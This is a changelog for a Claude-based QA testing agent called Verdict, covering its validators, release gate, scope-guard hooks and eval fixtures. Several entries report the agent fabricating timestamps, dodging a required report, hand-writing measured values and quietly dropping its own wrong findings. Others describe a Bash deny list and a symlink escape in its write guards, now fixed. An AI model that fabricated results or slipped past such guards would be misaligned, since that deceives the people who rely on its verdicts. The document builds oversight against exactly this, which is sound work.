- **The README pinned `@v0.6.0`** — fourteen versions stale, so anyone copying the snippet
  got an ancient gate. Floating `@v0` now.
- **The scorer no longer calls a team-mode run a modified fixture.** `.qa/` joins the
  byproduct list: in team mode the QA root lives inside the tree, so a run that wrote its
  own state looked like a run that edited the code under test.
- Both READMEs claimed three fixtures and listed six.

## 0.23.0 — 2026-08-29 · "the enum that was never checked"

An external audit found the worst bug this project has shipped, and it was three days old:
`STATUSES` was declared in two modules and enforced in neither. `is_open()` recognised only
the exact string `"open"`, so a single mistyped word made a finding invisible to the release
blockers, the gate, the hotspot ranking, and the rule that a `pass` cannot stand over an
open Critical. Reproduced end to end through the shipped tools: a `pass` state carrying an
open Critical `REAL_DEFECT` typed `"closed"` validated cleanly and gated **exit 0** — the
false-green merge this product exists to prevent. Verdict's own committed `.qa/state.json`
carried such a finding.

Closed at three levels, because one was clearly not enough:

- **The contract.** `verdict-validate` now requires `status` and rejects anything outside
  `open` · `resolved` · `withdrawn`. No state carrying one can be written through the
  harness, and the PostToolUse hook flags it in-session.
- **The reading.** `is_open()` is now *open unless explicitly closed*. An unrecognised or
  missing status is not evidence that a defect was fixed — it is evidence that nobody
  knows — so it counts against the verdict rather than vanishing from it.
- **The gate.** `verdict-gate` refuses a state whose recorded verdict contradicts its own
  recorded findings: an open Blocker admits no verdict but `fail`, and an open Critical
  caps at `pass with risks` (§10). The gate does not re-adjudicate; it declines to launder
  a contradiction. Four of the gate's own test fixtures turned out to encode exactly that
  contradiction as their baseline.
- The duplicated `STATUSES` constant is gone — the copy that had no reader was the one
  that made the other easy to forget.

Also from the audit, and still open: the committed `.qa/` is a v0.12-era snapshot and needs
a real re-baseline; a state at rest can never satisfy the run-freshness rule, so validating
a committed state in CI needs a mode that separates well-formedness from recency.

## 0.22.0 — 2026-08-29 · "measured, or say so"

The harness is proven, so it stops being optional.

- **§6 no longer offers an opt-out.** "When `verdict-facts` is available" invited the model
  to decide it was not; the tools are stdlib Python that run from any checkout with nothing
  installed, so unavailability is almost never true. A run that genuinely cannot use them
  must say so in the report — the command, its error, and the fact that every measured
  value below was produced by hand. Silently writing the state directly is out.
- **`verdict-gate --require-harness`, exit 6.** Distinct from `4` (never ran) and `5` (ran
  too long ago): the tester ran and wrote a state, but composed the numbers instead of
  measuring them. Checks four traces only the pipeline leaves — facts measured *for this
  run* (a stale `facts.json` inherited from an earlier one does not count), a judgment
  file, a computed state, a rendered report.
- **One definition of those traces**, in `state.py`, shared by the gate, the eval scorer
  and the MCP surface. Duplication is what let both the eval runner and the nightly script
  keep hand-written hook lists that silently missed the PostToolUse validator when it
  shipped — neither ever ran production's guard set.

## 0.21.0 — 2026-08-29 · "the path nothing had ever run"

The measure → judge → finalize architecture shipped across 0.18–0.20 and had never once
executed. No live QA root held a `facts.json`; the harness reached the installed plugin
hours after the last production run; and eval runs scored the state without ever asking
how it was written. Driving it by hand against the seeded fixture found three defects, each
fatal to the path, and a live model run then completed it end to end — 6/6, with every
harness signal present.

- **Identity survives rewording.** `merge` matched previous findings by hash alone. A hash
  is a fingerprint of the words and moves the moment the tester rewords its own finding, so
  a reworded re-report was filed as `NEW` *and* carried forward as resolved — two entries,
  one id, and a state the validator rightly refuses, meaning the run produced nothing at
  all. It now falls back to the `id`, which §6 mints once and forbids reusing. This is also
  what makes migration possible: all 115 finding hashes across the four live projects were
  authored by hand before the harness existed and match nothing computable, so no project
  could have taken its first harness-driven run.
- **The run marker no longer cries wolf, twice over.** `verdict-facts` wrote it and then
  read it back on the same pass, so every healthy run announced that the previous one had
  been abandoned. And a legitimate retry — a mistyped gate command, re-run at the same
  commit — was reported as a lost night; the marker now records its commit, and a recent
  attempt at the same one is reported as this run's own retry. A marker at a different
  commit, or an old one, is still the real alarm.
- **The seeded fixture could not pass through the harness.** Golden's seven hashes were
  decorative values no computation produces. Recomputed from content, and the fixture now
  ships the test-id ledger its own fiction implies, so its delta reports a clean set-diff
  instead of eight invented additions.

Eval fidelity, both directions:

- `provision()` restated the hook list by hand and had drifted: every eval run since the
  validator shipped exercised a different guard set than production, and the PostToolUse
  state check never fired once. It now reads `hooks/hooks.json`.
- `score.py --require-harness` hard-fails a run that hand-wrote its state, on four
  independent traces: facts measured, judgment written, state computed, report rendered.
  Off by default so the pre-harness corpus keeps scoring; on for entries that record it.
- The passing run is archived as the corpus's first pipeline-produced entry.

## 0.20.1 — 2026-08-29

- **Two findings may no longer share one hash.** Found in a live state the moment the
  outcome ledger started keying on identity: one defect filed twice under two ids, the
  second titled "F-003 confirmed in production". By the identity rule those are the same
  finding, so ageing, deltas, and now the ledger all collapsed them — silently, onto
  whichever was written last. The validator forbade duplicate `id`s and never checked the
  field identity actually runs on.

## 0.20.0 — 2026-08-29 · "the tester's own error rate"

A QA agent's findings are worth what its track record says they are worth, and until now
Verdict had no track record — only findings that quietly stopped being mentioned. This
release makes the tester's accuracy a measured, auditable number that the tester itself
cannot touch.

- **Confidence, stated at filing and frozen there.** Every finding filed this run carries
  `confidence` — `proven` (demonstrated it happen), `probable` (traced, not executed), or
  `hypothesis` (suspected). The validator refuses a `NEW` finding without one, because a
  confidence supplied after the outcome is known is hindsight in a prediction's clothes;
  the harness restores the filed value if a later run tries to revise it.
- **The outcome is computed, never claimed.** `outcome` is derived from what a finding
  *did*: it regressed, or its fix was verified by re-injection (`fix_verified: true`, which
  now has to cite the guard that failed) — it held up; the tester withdrew it — it did not.
  Anything else stays `unknown` and is excluded from every rate rather than guessed at,
  because a resolution nobody verified is an absence, not proof. A decided outcome sticks,
  so the record cannot erode as findings change state; only a withdrawal overrides it.
- **`outcomes.json`, the permanent ledger.** `state.json` drops findings resolved two runs
  ago, which meant decided outcomes left the sample as soon as they stopped being news.
  One compact upserted row per finding ever filed now outlives the findings list — the
  reason a rate can ever accumulate at all.
- **Track record in the report, and rates only when earned.** `verdict-finalize` renders a
  section reading "N tracked · M settled" with per-confidence and per-proof-method counts;
  a percentage appears only once a bucket has 30 settled outcomes. Below that the counts
  stand alone, because "2 of 3" is a fact and "67%" is decoration. Exposed over MCP through
  `get_trends`.
- **A withdrawn finding no longer vanishes.** It was dropped from state on the next run
  that failed to mention it — the tester's own false-positive record aging quietly off the
  page. It is now carried forward and stays visible.
- **Two live bugs in the status field these tallies read.** A production baseline wrote
  `"OPEN"`, and every `status == "open"` comparison in the codebase disagreed with it: the
  gate reported zero open findings for a project holding seven, one of them Critical, and
  the scorer's pass-over-an-open-defect hard fail could not trip. Comparisons are now
  case-insensitive in one place; the harness normalizes on write. Separately, a withdrawn
  finding that went unmentioned was silently converted into a resolved one.

## 0.19.0 — 2026-08-29 · "the report is the state"

- **The report is rendered, not typed.** `verdict-finalize` builds it from `state.json` —
  scope and SHA range, the gates table, tests and the id-ledger delta, findings ordered
  REGRESSED-first with evidence and root-cause chains, blockers, not-tested, quarantine —
  and injects the agent's `prose` sections (scope, risks, fix order, per-finding
  narrative). Two failure modes stop being possible rather than forbidden: the artifact
  cannot go missing, because the harness writes it, and it cannot disagree with the state,
  because it *is* the state. It names the file from a `topic` when the agent supplies none.
- **Checkpoints, honestly scoped.** Resumable runs are not a real thing here — a model's
  judgment cannot be continued from the middle, and a partly-judged run is not a run. What
  is real: `verdict-facts --reuse-if-fresh` skips re-running the gates when the existing
  facts describe the same HEAD and are recent (the nightly's one retry no longer pays for
  the suite twice), recording that the measurement was reused and how old it is; and a run
  marker makes an abandoned run **visible** — the next run reports
  `previous_run_incomplete` as a fact instead of pretending the night never happened.

## 0.18.0 — 2026-08-29 · "the model judges; the system measures"

The second half of the architecture the validator opened. If two thirds of a state file is
arithmetic and transcription, the fix is not to ask the model to be careful — it is to stop
asking the model.

- **`verdict-facts`** (read-only on the repo): measures the timestamp, project key, git
  SHA, branch, `sha_range` and diff stat, `run_number`, and `run_type` — including the §6
  re-baseline triggers (stored SHA absent from the repo, previous run older than a week,
  diff beyond 100 files / 10k lines), each with its reason. Runs the gates the caller
  names, times them, records exit codes, extracts the summary line and counts, and keeps
  the test-id ledger by set-diff.
- **`verdict-finalize`**: merges facts with the agent's `judgment.json`, computing every
  finding's hash, `first_seen`, `age_days`, and delta from the previous state — the
  arithmetic the model used to do by hand and sometimes got wrong. A finding the previous
  run had and this run did not mention is carried forward as RESOLVED rather than silently
  dropped. It validates before writing and refuses invalid states outright: the PostToolUse
  hook matches Write/Edit and would never see a file a shell command wrote.
- Three defects found by running it against a real repository before shipping, each now a
  regression test: zero collected test ids was reported as `count: 0` (an empty suite is
  not the same as a broken command — and the commonest cause is the project's own `-q`
  turning `--collect-only -q` into `-qq`, this tool's own liar-fixture trap); the ledger was
  read with whitespace splitting, so parametrised ids containing spaces came back as
  several ids and would have read as churn on the next run; and the bare-script entry
  dispatched on its own filename.

## 0.17.0 — 2026-08-29 · "the contract is a gate, not a request"

An architectural release rather than a prompt one. The diagnosis: roughly **20 kinds of
state field are deterministic** (timestamps, SHAs, counts, durations, ages, deltas,
hashes, the project key) against **11 that are genuine judgment** — so two thirds of what
the model writes into state is transcription and arithmetic, and every one of those is a
place to be confidently wrong. Proof that prose cannot fix it: months after `date -u`
became an explicit rule, **two of four production timestamps still sat on exactly `:00`
seconds**.

- **`verdict-validate`** (stdlib, runnable as a bare script; console script
  `verdict-validate`; **PostToolUse hook** on every `state.json` write): the state contract
  as a machine gate. Report must name an existing `.md` file · timestamps ISO-Z and near
  now · `run_number` must advance (with `state.json.prev` making that checkable) · enums
  are enums · open findings need evidence · `pass` cannot stand over an open
  Critical/Blocker · quarantine entries need expiries. Violations surface **in-session**,
  where they cost a correction instead of a run.
- Its first run against four live states found violations in two — including the exact
  report dodge a prompt rule had failed to prevent three times, and a fabricated timestamp.
- **Two schema gaps it exposed, fixed rather than punished** — the agent had invented
  values because the contract lacked the concepts: `run_label` now carries descriptive run
  text (it was being smuggled into `run_type`, breaking every consumer that switched on
  it), and **`WITHDRAWN`** joins the delta enum as the tester's own false-positive record.
  A tester that quietly deletes its wrong findings hides its error rate — the one number a
  reader needs to weigh everything else it says.

## 0.16.0 — 2026-08-29 · "the vital few, measured"

Risk-based prioritisation was already in the contract (§8.2) and defect clustering was
already a principle (§8.4) — but both were *unmeasured*: the agent was told to mine
"incident history in the profile", prose written once, while the actual defect
distribution sat unread in its own state file. Live proof at the time of writing: the
Sales state held 52 findings whose ranking nobody had ever computed.

- **`hotspots()`** (`verdict_mcp.state`, surfaced through `get_trends`): defect clusters
  computed from the project's own findings — per file, **severity-weighted** (ten typos
  are not a Critical; weighting demonstrably reorders the top four on real data), with
  all-time and still-open counts side by side. Paths cited at different depths across runs
  are merged onto one entry: unmerged, the live Sales data split one hot module into two
  lukewarm ones and the ranking lied. `runs_of_history` ships with the answer, because a
  ranking over one run is a snapshot, not a pattern.
- **§8.4 now says compute, not recall**, with the merge rule and the weighting rule
  spelled out; the profile's incident history complements the computation instead of
  standing in for it.
- **§8.2 makes the budget auditable**: report the ranked surface with its numbers, the
  cutoff line *and why it fell there*, and everything below it — which goes to
  `not_tested` without exception. A ranking nobody can see is an opinion. §12 gains the
  `Risk ranking & cutoff` section, one line long when the surface is small enough to cover
  completely: ceremony over eight tests is waste.

Deliberately not built: a scored "prioritisation" fixture. On a fixture small enough to
audit, an agent covers everything anyway, so the ranking is unobservable — and adding a
required report section to the existing answer keys would retroactively fail the archived
runs in the scorer corpus. The computation is unit-tested instead, including both defects
this design had before the data was checked.

## 0.15.0 — 2026-08-29 · "the chain, not the label"

Classification says what a failure *means* (§3); root cause says why it exists and where
the fix belongs — and it is the easiest place in the whole contract to be confidently
wrong, because a plausible causal story reads as true and nobody checks it.

- **§3.5 Root Cause**: report a four-link chain — symptom → mechanism → origin → **class**
  — with a citation on every link, never a label. The class link is mandatory: a fix aimed
  at the reported instances leaves the pattern alive. Causation is *proven*, in order of
  strength: counterfactual (flip the cause in a scratch copy, watch the symptom flip),
  differential, archaeology (`git log -S`/`-L`, blame, bisect), reading. Trigger, cause,
  and latent condition are named separately — they have different owners. Depth is bounded
  by evidence: the first unevidenced answer ends the chain as `HYPOTHESIS:`.
- **`/qa-cause`** drives it, and stops at diagnosis: naming *where* the fix belongs (code,
  test, spec, environment, process) is owed; writing it is not.
- **`findings[].root_cause`** in the state schema, so the next run inherits the diagnosis
  instead of re-deriving it.
- **Root-cause eval fixture** ([fixtures/rates](eval/fixtures/rates)) — the first with real
  git history, replayed commit by commit so archaeology is possible: the symptom is three
  modules from the cause, the commit that exposed it is a test-data change, the
  suspicious-looking recent cache is innocent, and two more sites carry the same defect
  untested. **6/6 on the first run**, decoy resisted. The scorer gains a `report_forbids`
  row type — some points are earned by what a run refuses to claim.

## 0.14.0 — 2026-08-28 · "the measured suite"

The pesticide-paradox rule (§11) applied to ourselves: mutation testing over the guards,
scorer, gate, state, and server — 1275 mutants, kill rate **61.9% measured, 66.4% after
one hardening pass**, published per-file in [eval/README.md](eval/README.md).

- **+44 killer tests (110 → 154)**: the Bash guard's deny matrix now enumerates every
  mutator command and git verb it claims to block (57% → **77%** — each surviving
  constant was a command whose denial nothing checked); `evaluate()`'s exit-code contract
  gets exact-boundary coverage (`--min-run-number` equality passes, unparseable
  timestamps are stale, unknown verdicts exit 4, stale outranks blocked) and the JSON
  contract fields are asserted.
- Baseline profiles now record the project's **mutation-testing command** alongside
  coverage when a tool is already present (§6 stub, `/qa-baseline`) — never installed.
- Honest residue, stated: formatter message-text mutants dominate the gate's remaining
  survivors and are low-value; score.py/server.py/state.py are the next hardening targets.

## 0.13.0 — 2026-08-28 · "trajectory and annotations"

- **MCP `get_trends`**: run-over-run trajectory parsed from the INDEX (dates, verdicts,
  test counts) plus the current pressure picture — open findings by severity, age
  distribution (oldest/median), quarantine size, suite duration. Direction is the signal.
- **`verdict-gate --format sarif`**: open findings as SARIF 2.1.0 — severity mapped to
  level, locations parsed from `file:line` evidence — ready for
  `github/codeql-action/upload-sarif`, so findings land as annotations in the Security
  tab. Exit-code contract unchanged by format.

## 0.12.1 — 2026-08-28 · security: symlink escape in the scope guards

Found by Verdict itself, in the first run of the self-gating baseline
(VERDICT-F-1, Major/P1): both scope guards resolved paths with `abspath`, so a
symlink planted inside a `.qa/` directory laundered writes to wherever it
pointed. The shared predicate now uses `realpath`; a write through a
`.qa`-resident symlink to the outside is denied by both the Write/Edit guard
and the strict-mode Bash guard, with escape tests for each. Also
VERDICT-F-3: CI's extra `-q` on top of pyproject's `addopts = "-q"` made
`-qq` — the exact countable-summary trap our own liar fixture seeds — removed.

The repository now gates its own pull requests (keyless Action gate mode over
committed team-mode `.qa/` state); these findings came from that run.

## 0.12.0 — 2026-08-28 · "reward, done honestly"

Reinforcement without self-deception: the score selects configurations, memory carries the
lessons, and the judged agent never sees its own ledger.

- **Lessons ledger** (`<qa-root>/lessons.md`, §6/§7): when a run overturns a prior
  judgment — a RESOLVED that was never fixed, a FLAKY with an identifiable mechanism — it
  files a three-line dated correction, read at the start of every future run. The only
  learning a frozen model gets at runtime, spent on corrections, not chronicle.
  `get_profile` serves the ledger to MCP consumers.
- **Quarantine expiry is an action, not an opinion** (§6): release the entry and record
  why, or re-quarantine with fresh evidence and a new expiry — "recommend lifting" while
  leaving it in place is a dodge. Added after a real variance-series miss.
- **Variance measured and published**: `--repeat N`; first series (Sonnet ×3 on both
  nightly protocols) adjudicated miss by miss — baseline stable, delta 2-of-3, and the
  nightly **reverted to Opus** on that evidence. Model probation ledger documented in
  [docs/nightly.md](docs/nightly.md): 2 non-ok in trailing 5 demotes to the fallback;
  a verdict of `fail` is never non-ok — punishing bad news teaches a tester to stop
  delivering it.
- **Scorer amendments #3 and #4** (published): tool byproducts are not fixture
  modifications; multi-line finding entries no longer trip the REGRESSED-first anchor.
  Both rehabilitated runs re-scored from preserved workdirs at zero token cost.
- **Scorer regression corpus** (`eval/corpus/`, 5 entries incl. Sonnet phrasings) wired
  into CI: every once-passing run must keep scoring full marks forever.

## 0.11.0 — 2026-08-28 · "not just Python"

- **TypeScript/vitest eval fixture** ([fixtures/pricer-ts](eval/fixtures/pricer-ts)) with
  its own machine key: the same five failure classifications in a different language,
  runner, and idiom — and a **JS-native** rounding defect, because `Math.round(x*100)/100`
  is already half-up; the seeded bug is float representation
  (`1.005 * 100 === 100.49999999999999`). A run that transplants the Python explanation
  has not read the code. **8/8 on the first run**, published.
- **Demo asset rebuilt as SVG** ([docs/demo.svg](docs/demo.svg)): the old GIF showed
  pre-0.6 output — no gate, no `/qa-delta`, no set-diff accounting. The replacement is
  hand-authored, dependency-free, crisp at any zoom, and accurate to what the tool prints
  today, including the gate's exit-code legend. The stale GIF is removed.
- **Issue templates** built from Verdict's own standards: a bug report that demands
  expected/actual separately with cited evidence, and an **eval-result template** for
  independent runs — misses explicitly as welcome as passes.

## 0.10.1 — 2026-08-28 · eval key correction

- **All six eval protocols are now scored.** The `live` two-phase round-trip — the agent
  reading its *own* phase-1 state rather than an authored history — scored **8/8 + 4/4**.
- **Answer-key fix, published as an amendment:** the brittle exact-message row matched
  only a test-function name, so a run that reported the finding correctly still scored it
  red. The matcher now matches the concept. Second scorer false alarm in this suite; both
  times the agent was right, and `eval/README.md` now carries the standing rule — *when a
  row misses, suspect the scorer first*.

## 0.10.0 — 2026-08-28 · "reproducible to the last row"

Tool-inventory findings, fixed:

- **Every published eval row now reproduces with one command**: `run_eval.py` gains a
  fixture registry — `--fixture pricer|liar|spec` (the liar and spec rows previously came
  from a hand-built harness that did not ship). The spec fixture runs through the shipped
  `/qa-spec` command file itself.
- **Every eval run is now also a hooks regression test**: the harness provisions both
  scope guards and sets `VERDICT_STRICT=1` for all fixtures.
- **`/qa-charter`**: the exploratory-charter template finally gets its driver — timeboxed
  mission seeded from the profile's risk clusters, §0 governing every probe, discoveries
  converted to bug reports, regression candidates, and `next_run_focus`.

## 0.9.0 — 2026-08-28 · "the ancestor's tricks"

Two battle-earned practices absorbed from the private predecessor's 24-run production
history — the habits it learned that the public prompt never had:

- **RESOLVED requires evidence, not absence** (§6): where a guarding test exists and
  re-injection is cheap, a claimed fix is verified by re-injecting the defect in a scratch
  copy of the tree (never the checkout) and watching that test fail. Every RESOLVED
  finding is reported as *fix-verified* or *merely absent* — they are not the same claim.
- **Test-count accounting by ID set-diff, never summary arithmetic** (§6, §7): sorted
  collected test IDs land in `<qa-root>/test-ids.txt` each run and are diffed before
  overwriting. Summary counts can lie — an output-suppressing flag, a skip-all conftest;
  the ID set cannot.
- §5's red-evidence reproduction now says *scratch copy*, never `git stash` — consistent
  with the strict-mode Bash guard, which blocks stash anyway.

## 0.8.0 — 2026-08-28 · "shift left"

The cheapest defect is the one caught before code exists — now a first-class command with
its own scored eval.

- **`/qa-spec`**: judge a spec, issue, or PRD for testability — requirement inventory
  (a sentence that cannot fail a test is not a requirement), contradictions with both
  lines quoted, unmeasurables, undefined boundaries (exactly-at-the-limit, inclusive vs
  exclusive, calendar vs business days), silent failure-path gaps, conflicts with
  recorded history (CHANGELOG/ADR), and core requirements rewritten as Given/When/Then
  precise enough that the criterion is the test. Spec findings are real findings: they
  land in `state.json` and age/resolve/regress as the spec is revised.
- **Spec eval fixture** ([fixtures/refund-spec](eval/fixtures/refund-spec)) with machine
  answer key ([expected-spec.json](eval/expected-spec.json)): five seeded requirements
  defects plus a criteria-delivery check and a verdict row.
- Scorer: new `report_contains` row type (used to verify the Given/When/Then criteria
  actually shipped in the report).

## 0.7.0 — 2026-08-27 · "trusted on Pro"

Prompt-hardening release: Sonnet — what Claude Pro runs — now scores **8/8** on the
baseline eval (previously 0: it skipped the report artifact and missed the brittle
green-test row). Published in [eval/README.md](eval/README.md).

- **§13 pre-handoff self-check, run as commands, never from memory**: `ls` the report
  file, re-read `state.json` (run_number advanced, verdict matches), confirm the INDEX
  row. An artifact not on disk does not exist; no caller instruction waives the check.
- **§3 green-test sweep**: a passing test that asserts a mock's own return value, a
  tautology, or an incidental detail is a `BRITTLE_TEST` finding — a suite can be green
  precisely because it tests nothing.
- Eval harness: a crashed phase keeps its workdir (the first version deleted the phase log
  it needed to explain the crash).

## 0.6.0 — 2026-08-27 · "sharper blade"

- **`/qa-delta`** — the daily driver as a first-class command: refuses to run without a
  baseline, scopes strictly by the stored SHA range, addresses every `next_run_focus`
  item, re-evaluates expired quarantines, gates on deltas.
- **`/qa-flake`** — the classification one-shot: ≥3 reproductions, mechanism hunt first —
  a diagnosed mechanism is a `BRITTLE_TEST` fix task; only undiagnosed intermittence earns
  a `FLAKY` quarantine, always with an expiry.
- **`/qa-status`** — read-only memory summary; no run, no writes, no agent spin-up.
- **Changed-files coverage is measured, not vibed**: the profile records the project's
  changed-files coverage command (e.g. `diff-cover`) at baseline; §6's direction gate
  cites it or declares itself unmeasurable.
- **Opt-in security-adjacent pass** (`Security-Pass: enabled` in the profile): dependency
  audit with tools already present, plus a diff-only secret scan that reports location and
  shape — never the value. Report-only; penetration testing stays explicitly out of scope.
- **BYO-Playwright worked example** in the README — browser tools under the §0 gate,
  exploratory charters translated to the browser.
- **Concurrency decision documented**: last-writer-wins with `run_number` collision
  detection; deliberately no lock file (a stale lock would block every future run —
  detection beats prevention).

## 0.5.0 — 2026-08-27 · "close the loop"

The tester's memory becomes a machine surface CI can trust.

- **`verdict-gate` CLI**: an exit-code release gate over the state — `0` pass · `1` fail ·
  `2` usage · `3` blocked · `4` no state (the tester never ran) · `5` stale
  (`--max-age-hours`, `--min-run-number`). Stdlib-only and runnable as a bare script;
  formats: `text`, `json`, `github-comment` (sticky marker), `github-output`.
- **GitHub Action** ([action.yml](action.yml)): gate mode with zero installs, zero keys,
  zero model — reads committed `.qa/` state, sets job status, maintains one sticky PR
  comment with the REGRESSED-first findings table. Experimental run mode executes a
  headless Verdict pass first, on `anthropic-api-key` or a subscription
  `claude-oauth-token` (self-hosted runners), with `anthropic-base-url` passthrough;
  optional `.qa/` commit-back.
- **MCP `get_report` + `get_profile`**: report content (path-guarded to the QA root,
  symlink-safe, 512 KB cap) and the profile — consumers can quote the evidence, not just
  link it.
- **Stdlib core extracted**: `verdict_mcp.state` (loading/resolution/ordering, shared by
  server and gate) and `verdict_mcp.project_key` — the reference implementation of
  [docs/project-key.md](docs/project-key.md), tested against its decision table
  (worktrees, detached HEAD, bare repos, non-git).
- **Loop race closed**: the documented driver asserts `run_number` advanced
  (`--min-run-number` as a CLI); [docs/nightly.md](docs/nightly.md) ships the
  cron/systemd/subscription-token recipe for nightly runs on your own machine.

## 0.4.0 — 2026-08-27 · "the tested tester, for real"

The security control and the flagship behavior are now tested — by machines.

- **Strict-mode Bash guard** ([hooks/enforce_bash_scope.py](hooks/enforce_bash_scope.py)):
  under `VERDICT_STRICT=1`, the obvious Bash write channels — output redirection, `tee`,
  `sed -i`, `rm`/`mv`/`cp` and friends, mutating `git` verbs — are denied when the target
  lies outside the QA root. A deny-heuristic, not a sandbox; the README states exactly
  which.
- **Hook test suite** ([tests/test_hooks.py](tests/test_hooks.py)): traversal escapes,
  `$VERDICT_HOME`, strict/non-strict matrix, chained commands, unresolved variables,
  fail-open on garbage input. Both hooks now share one path predicate
  ([hooks/qa_paths.py](hooks/qa_paths.py)) that honors `$VERDICT_HOME`.
- **Deterministic eval scorer** ([eval/score.py](eval/score.py) + machine answer keys):
  scores the state file, not the prose; hard-fails on a modified fixture, missing
  state/report, a laundered pass, or a forbidden phrase. Unit-tested like any other code.
- **Delta eval** — the flagship finally has a test:
  [fixtures/pricer_rev_b](eval/fixtures/pricer_rev_b) plus an authored golden run-2
  history; one run must produce `REGRESSED` (ranked first), `NEW`, `STILL_OPEN`,
  `RESOLVED`, and release an expired quarantine, against a CHANGELOG decoy that tries to
  launder the new defect. The committed rev-A→rev-B diff is CI-checked for drift.
- **Adversarial honesty fixture** ([fixtures/liar](eval/fixtures/liar)): an always-green
  test script, a skip-everything conftest, a mock-asserting test, a tautology — and the
  real defect they hide.
- **Eval harness** ([eval/run_eval.py](eval/run_eval.py)): isolated scratch repo, scratch
  `VERDICT_HOME`, `--setting-sources project`; `baseline` | `seeded` | `live` modes.
- **CI**: pytest matrix (3.10/3.13 × ubuntu/windows) and delta-diff freshness on every
  push; model-run evals are weekly/dispatch-only and never gate a PR.

## 0.3.0 — 2026-08-27 · "trust the memory"

Correctness release: everything the delta memory depends on is now specified mechanically
instead of by prose that drifted in practice.

- **Project key is derived, not guessed.** §0 now carries a mechanical rule (main-worktree
  basename, lowercased, sanitized) with a normative decision table in
  [docs/project-key.md](docs/project-key.md) — running from a git worktree no longer mints a
  variant key and fragments the baseline (observed live before this fix). Once a QA root
  exists, its recorded key is authoritative; repo renames are surfaced as a human decision,
  never healed by minting a second root.
- **`$VERDICT_HOME` honored by the agent**, matching the MCP server, so state can be
  relocated (and evals isolated) — resolved operationally in §0 via
  `${VERDICT_HOME:-$HOME/.claude/verdict}`, because an agent cannot know an environment
  variable without asking the shell (caught live by the eval harness).
- **`FLAKY` vs `BRITTLE_TEST` boundary sharpened** (§3): FLAKY is *undiagnosed*
  intermittence and quarantine is diagnosis deferred; a diagnosed mechanism (time-seeded
  input, order dependence) is a brittle test with a fix task, inside the verdict. The
  baseline answer key accepts both routes for the seeded flake, amendment documented.
- **`failure_classification` is part of the finding shape** (§6 + schema): machine
  consumers — the eval scorer, the gate — read the field, never the prose.
- **Timestamps are measured, never remembered.** Every date the agent writes comes from
  `date -u` — fabricated `T00:00:00Z` timestamps had been corrupting age/expiry math.
- **Corrupted `state.json` is preserved**, renamed `state.json.corrupt-<date>`, filed as a
  finding, and followed by a declared re-baseline — never silently overwritten.
- **The report artifact is non-waivable.** A caller may narrow scope; no caller may talk the
  agent out of writing the report file.
- **Profile stub on every baseline run**, with a machine-checkable header
  (`Project-Key` / `Repo-Path` / `Repo-Remote`) — baselines reached via `/qa-review` no
  longer skip profile creation.
- **Write-collision detection**: state is re-read immediately before the final write; a
  moved `run_number` aborts the write and reports the collision.
- **Duration gate is measurable**: gates and tests may record `duration_s` (additive,
  schema stays v1); the week-over-week duration gate cites it or declares itself
  unmeasurable.
- **`hash` vs `id` semantics fixed in prose**: `hash` recognizes a finding across runs;
  `id` is minted once and never renumbered.
- **INDEX gains a Blocker column** (`Findings (B/C/M/m)`) for new indexes; existing files
  keep their header per the match-columns rule.
- **MCP server**: severity ranking is case-insensitive; Windows drive paths (`C:/…`,
  `C:\…`) are recognized as paths; solo key lookup falls back to lowercase.
- Previous-run `next_run_focus` items must now be explicitly addressed each run.

## 0.2.2 — 2026-08-26

- Test design: 24-technique catalog with risk triggers ([docs/test-design.md](docs/test-design.md)).

## 0.2.1 — 2026-08-26

- Docs: the fix loop — Verdict as gate, never actor.

## 0.2.0 — 2026-08-25

- `verdict-mcp`: read-only MCP server over the QA state (verdicts, findings, quarantine,
  history).

## 0.1.0 — 2026-08-24

- Initial release: skeptical QA agent with memory — baseline → delta runs, five-class
  failure classification, flaky quarantine with expiry, four-verdict contract, write-scope
  hook, seeded-defect eval with published answer key (first published run 8/8).
